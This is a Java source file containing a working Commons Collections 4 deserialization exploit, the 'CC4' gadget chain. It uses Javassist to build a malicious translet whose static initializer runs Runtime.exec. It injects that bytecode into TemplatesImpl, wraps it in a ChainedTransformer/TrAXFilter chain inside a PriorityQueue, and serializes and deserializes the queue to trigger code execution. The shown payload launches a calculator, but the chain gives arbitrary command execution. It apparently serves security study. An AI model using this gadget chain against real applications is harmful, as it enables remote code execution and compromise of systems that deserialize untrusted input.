
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;

import java.lang.reflect.*;
import java.util.PriorityQueue;

public class CC4 { // jdk 8, commons-collections4:4.0
    public static void main(String[] args) {
        try {
            ClassPool cp = ClassPool.getDefault();
            cp.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass EvilClass = cp.makeClass("EvilClass");
            EvilClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));
            EvilClass.makeClassInitializer().insertBefore("Runtime.getRuntime().exec(\"calc\");");

            TemplatesImpl tpl = new TemplatesImpl();

            setFieldValue(tpl, "_bytecodes", new byte[][] {EvilClass.toBytecode()});
            setFieldValue(tpl, "_name", "blabla");
            setFieldValue(tpl, "_tfactory", new TransformerFactoryImpl());

            ChainedTransformer chain = new ChainedTransformer(
                    new Transformer[] {
                            new ConstantTransformer(TrAXFilter.class),
                            new InstantiateTransformer(new Class[] {Templates.class}, new Object[] {tpl})
                    }
            );

            PriorityQueue pq = new PriorityQueue(2, new TransformingComparator(chain));
            setFieldValue(pq, "size", 2);

            deserialize(serialize(pq));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static ByteArrayOutputStream serialize(Object object) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(object);
            return baos;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    static void deserialize(ByteArrayOutputStream baos)  {

        try {
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void deserializeFromFile(String filename) throws IOException, ClassNotFoundException {
        try {
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    static void setFinalField(Object obj, String name, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);

            Field modifiersField = Field.class
                    .getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers()
                    & ~Modifier.FINAL);

            field.set(obj, value);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

    }

    static Object getFinalField(Object obj, String name) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);

            Field modifiersField = Field.class
                    .getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers()
                    & ~Modifier.FINAL);

            return field.get(obj);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return null;
    }

    static Object getFieldValue(Object obj, String name) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);
            return field.get(obj);

        } catch (Exception e) {
            System.out.println(e);
            return e;
        }

    }

    static void setFieldValue(Object obj, String name, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(obj, value);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
